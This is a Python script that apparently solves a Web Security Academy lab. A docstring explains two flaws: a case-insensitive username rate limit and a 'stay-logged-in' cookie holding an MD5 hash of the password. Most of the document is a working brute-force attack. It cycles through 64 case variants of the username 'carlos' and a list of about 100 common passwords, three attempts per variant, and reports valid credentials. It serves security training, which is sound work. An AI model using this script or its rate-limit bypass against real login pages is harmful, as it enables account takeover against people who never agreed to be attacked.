'''
2 vulnerabilities in this challenge:
1. Rate limit when logging in is username case-insensitive, which opens up many chances to brute-force the password (This method works only when the password list is known, and finite).
   - For example: username=carlos opens up 2^6 = 64 different variations of the username. Each has max 3 attempts, so 
   there are total 192 attempts.
2. The "stay-logged-in" cookie is simply base64-encoded, and when encoded, easily found out that it has the format
   username:some_string. Since some_string uses the characters a-f,0-9, it is possible the md5 hash of something.
   --> Put on CrackStation, it appears to be the md5 hash of the password.
'''

import requests

burp0_url = "https://0a21000b033e59b88480363900120003.web-security-academy.net:443/login"
burp0_cookies = {"session": "5S9pTcjTWauVojAm8GQxnHNe4NyJAJ2i"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0a21000b033e59b88480363900120003.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a21000b033e59b88480363900120003.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}

passwd_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

burp0_data = {"username": "", "password": "", "stay-logged-in": "on"}
victim_username = "carlos"
passwd_idx = 0

for mask in range(2 ** len(victim_username)):
    if passwd_idx >= len(passwd_list):
        break

    num_try = 3
    
    while num_try > 0 and passwd_idx < len(passwd_list):
        password_attempt = passwd_list[passwd_idx]
        burp0_data["username"] = ""
        for i in range(len(victim_username)):
            if (mask >> i) & 1:
                burp0_data["username"] += victim_username[i].upper()
            else:
                burp0_data["username"] += victim_username[i].lower()
        
        burp0_data["password"] = password_attempt
        
        print(f"[*] Trying username: {burp0_data['username']} with password: {password_attempt} (Attempts left: {num_try})")
        
        response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        if "Invalid username or password" not in response.text:
            if "too many" in response.text:
                num_try = 0
                break
            print(f"[+] Found valid credentials: {burp0_data['username']}:{password_attempt}")
            exit(0) 
        
        num_try -= 1
        passwd_idx += 1
